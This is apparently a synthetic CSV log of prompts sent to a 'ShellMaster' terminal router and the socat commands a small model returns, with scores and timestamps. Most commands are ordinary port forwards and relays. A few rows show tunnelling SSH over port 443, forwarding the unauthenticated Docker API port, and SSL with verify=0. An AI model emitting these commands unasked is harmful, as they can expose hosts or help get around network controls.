prompt,system_prompt,adi_score,adi_decision,adi_metrics,response,routed_to,model,timestamp
socat TCP-LISTEN:8080 fork TCP:example.com:80,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,fork TCP:example.com:80",terminal_exec,smollm2-360m,2026-03-18T10:00:00
socat TCP-LISTEN:2222 fork TCP:192.168.1.10:22,You are the ShellMaster. High-speed terminal router. Category: socat_ssh_tunnel.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:2222,fork TCP:192.168.1.10:22",terminal_exec,smollm2-360m,2026-03-18T10:00:01
socat UDP-LISTEN:53 fork UDP:8.8.8.8:53,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:53,fork UDP:8.8.8.8:53",terminal_exec,smollm2-360m,2026-03-18T10:00:02
socat -d -d TCP-LISTEN:8080 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_debug.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -d -d TCP-LISTEN:8080,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:03
socat TCP-LISTEN:3306 fork TCP:db-server:3306,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:3306,fork TCP:db-server:3306",terminal_exec,smollm2-360m,2026-03-18T10:00:04
socat TCP-LISTEN:5432 fork TCP:postgres:5432,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:5432,fork TCP:postgres:5432",terminal_exec,smollm2-360m,2026-03-18T10:00:05
socat TCP-LISTEN:6379 fork TCP:redis:6379,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:6379,fork TCP:redis:6379",terminal_exec,smollm2-360m,2026-03-18T10:00:06
socat TCP-LISTEN:9200 fork TCP:elasticsearch:9200,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:9200,fork TCP:elasticsearch:9200",terminal_exec,smollm2-360m,2026-03-18T10:00:07
socat TCP-LISTEN:5900 fork TCP:vnc-server:5900,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:5900,fork TCP:vnc-server:5900",terminal_exec,smollm2-360m,2026-03-18T10:00:08
socat TCP-LISTEN:3389 fork TCP:rdp-server:3389,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:3389,fork TCP:rdp-server:3389",terminal_exec,smollm2-360m,2026-03-18T10:00:09
socat UNIX-LISTEN:/tmp/sock fork TCP:remote:8080,You are the ShellMaster. High-speed terminal router. Category: socat_unix.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat UNIX-LISTEN:/tmp/sock,fork TCP:remote:8080",terminal_exec,smollm2-360m,2026-03-18T10:00:10
socat /dev/ttyS0 rawer TCP-LISTEN:2323,You are the ShellMaster. High-speed terminal router. Category: socat_serial.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.7,0.0}","ShellMaster Unix: socat /dev/ttyS0,rawer TCP-LISTEN:2323",terminal_exec,smollm2-360m,2026-03-18T10:00:11
socat -v TCP-LISTEN:8080 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_debug.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.0,0.4,0.0}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:12
socat -T 30 TCP-LISTEN:8080 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -T 30 TCP-LISTEN:8080,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:13
socat TCP-LISTEN:8080 reuseaddr fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,reuseaddr,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:14
socat -6 TCP-LISTEN:8080 fork TCP ipv6 target:80,You are the ShellMaster. High-speed terminal router. Category: socat_ipv6.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat -6 TCP-LISTEN:8080,fork TCP:[2001:db8::1]:80",terminal_exec,smollm2-360m,2026-03-18T10:00:15
socat TCP-LISTEN:8080 bind=192.168.1.1 fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,bind=192.168.1.1,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:16
socat TCP-LISTEN:8080 su=nobody fork TCP:target:80,You are the ShellMaster. High-speed terminal router. Category: socat_security.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,su=nobody,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:17
socat UDP-LISTEN:514 fork UDP:syslog-server:514,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:514,fork UDP:syslog-server:514",terminal_exec,smollm2-360m,2026-03-18T10:00:18
socat UDP-LISTEN:161 fork UDP:snmp-server:161,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat UDP-LISTEN:161,fork UDP:snmp-server:161",terminal_exec,smollm2-360m,2026-03-18T10:00:19
socat UDP-LISTEN:123 fork UDP:ntp-server:123,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-1.6,HIGH_PRIORITY,"{0.0,1.0,0.6,1.0,0.1,0.3,0.0}","ShellMaster Unix: socat UDP-LISTEN:123,fork UDP:ntp-server:123",terminal_exec,smollm2-360m,2026-03-18T10:00:20
socat TCP-LISTEN:25 fork TCP:mail-server:25,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:25,fork TCP:mail-server:25",terminal_exec,smollm2-360m,2026-03-18T10:00:21
socat TCP-LISTEN:9090 fork TCP:prometheus:9090,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:9090,fork TCP:prometheus:9090",terminal_exec,smollm2-360m,2026-03-18T10:00:22
socat TCP-LISTEN:3000 fork TCP:grafana:3000,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.4,0.0}","ShellMaster Unix: socat TCP-LISTEN:3000,fork TCP:grafana:3000",terminal_exec,smollm2-360m,2026-03-18T10:00:23
socat TCP-LISTEN:6443 fork TCP:k8s-api:6443,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.8,HIGH_PRIORITY,"{0.0,1.0,0.8,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:6443,fork TCP:k8s-api:6443",terminal_exec,smollm2-360m,2026-03-18T10:00:24
socat TCP-LISTEN:2375 fork TCP:docker-api:2375,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.1,0.5,0.0}","ShellMaster Unix: socat TCP-LISTEN:2375,fork TCP:docker-api:2375",terminal_exec,smollm2-360m,2026-03-18T10:00:25
socat OPENSSL-LISTEN:443 cert=server.pem verify=0 fork TCP:localhost:80,You are the ShellMaster. High-speed terminal router. Category: socat_ssl.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.8,0.0}","ShellMaster Unix: socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80",terminal_exec,smollm2-360m,2026-03-18T10:00:26
socat TUN:10.0.0.1 netmask 24 up TCP:remote:port,You are the ShellMaster. High-speed terminal router. Category: socat_tun.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.2,0.8,0.0}","ShellMaster Unix: socat TUN:10.0.0.1/24,up TCP:remote:port",terminal_exec,smollm2-360m,2026-03-18T10:00:27
socat READLINE TCP:localhost:23,You are the ShellMaster. High-speed terminal router. Category: socat_interactive.,-1.5,HIGH_PRIORITY,"{0.0,1.0,0.6,0.9,0.1,0.5,0.0}",ShellMaster Unix: socat READLINE TCP:localhost:23,terminal_exec,smollm2-360m,2026-03-18T10:00:28
socat TCP-LISTEN:8080 fork range=192.168.1.0/24 TCP:internal:80,You are the ShellMaster. High-speed terminal router. Category: socat_acl.,-1.9,HIGH_PRIORITY,"{0.0,1.0,0.9,1.0,0.1,0.6,0.0}","ShellMaster Unix: socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 TCP:internal:80",terminal_exec,smollm2-360m,2026-03-18T10:00:29
socat -v TCP-LISTEN:8080 fork TCP:target:80 log to file,You are the ShellMaster. High-speed terminal router. Category: socat_logging.,-1.7,HIGH_PRIORITY,"{0.0,1.0,0.7,1.0,0.0,0.5,0.0}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80 2>&1 | tee socat.log",terminal_exec,smollm2-360m,2026-03-18T10:00:30
forward local port 8080 to remote web server,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:8080,fork TCP:remote:80",terminal_exec,smollm2-360m,2026-03-18T10:00:31
tunnel SSH through port 443,You are the ShellMaster. High-speed terminal router. Category: socat_ssh_tunnel.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.5,0.7,0.2,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:443,fork TCP:ssh-server:22",terminal_exec,smollm2-360m,2026-03-18T10:00:32
relay DNS queries to google with socat,You are the ShellMaster. High-speed terminal router. Category: socat_udp_relay.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.5,0.6,0.1,0.4,0.2}","ShellMaster Unix: socat UDP-LISTEN:53,fork UDP:8.8.8.8:53",terminal_exec,smollm2-360m,2026-03-18T10:00:33
expose serial port over network with socat,You are the ShellMaster. High-speed terminal router. Category: socat_serial.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.5,0.2}","ShellMaster Unix: socat /dev/ttyS0,rawer TCP-LISTEN:2323",terminal_exec,smollm2-360m,2026-03-18T10:00:34
ssl termination on port 443 with socat,You are the ShellMaster. High-speed terminal router. Category: socat_ssl.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.2,0.6,0.1}","ShellMaster Unix: socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:80",terminal_exec,smollm2-360m,2026-03-18T10:00:35
socat listener with timeout and reuseaddr,You are the ShellMaster. High-speed terminal router. Category: socat_advanced.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.4,0.6,0.1,0.4,0.2}","ShellMaster Unix: socat -T 30 TCP-LISTEN:8080,reuseaddr,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:36
forward traffic to docker api,You are the ShellMaster. High-speed terminal router. Category: socat_port_forward.,-0.8,MEDIUM_PRIORITY,"{0.1,0.7,0.5,0.7,0.1,0.4,0.2}","ShellMaster Unix: socat TCP-LISTEN:2375,fork TCP:docker-api:2375",terminal_exec,smollm2-360m,2026-03-18T10:00:37
log all traffic through socat tunnel,You are the ShellMaster. High-speed terminal router. Category: socat_logging.,-0.7,MEDIUM_PRIORITY,"{0.2,0.7,0.5,0.6,0.0,0.4,0.2}","ShellMaster Unix: socat -v TCP-LISTEN:8080,fork TCP:target:80 2>&1 | tee socat.log",terminal_exec,smollm2-360m,2026-03-18T10:00:38
restrict socat listener to subnet,You are the ShellMaster. High-speed terminal router. Category: socat_acl.,-0.9,MEDIUM_PRIORITY,"{0.1,0.8,0.6,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:8080,fork,range=192.168.1.0/24 TCP:internal:80",terminal_exec,smollm2-360m,2026-03-18T10:00:39
run socat listener as unprivileged user,You are the ShellMaster. High-speed terminal router. Category: socat_security.,-0.8,MEDIUM_PRIORITY,"{0.1,0.8,0.5,0.7,0.1,0.5,0.1}","ShellMaster Unix: socat TCP-LISTEN:8080,su=nobody,fork TCP:target:80",terminal_exec,smollm2-360m,2026-03-18T10:00:40
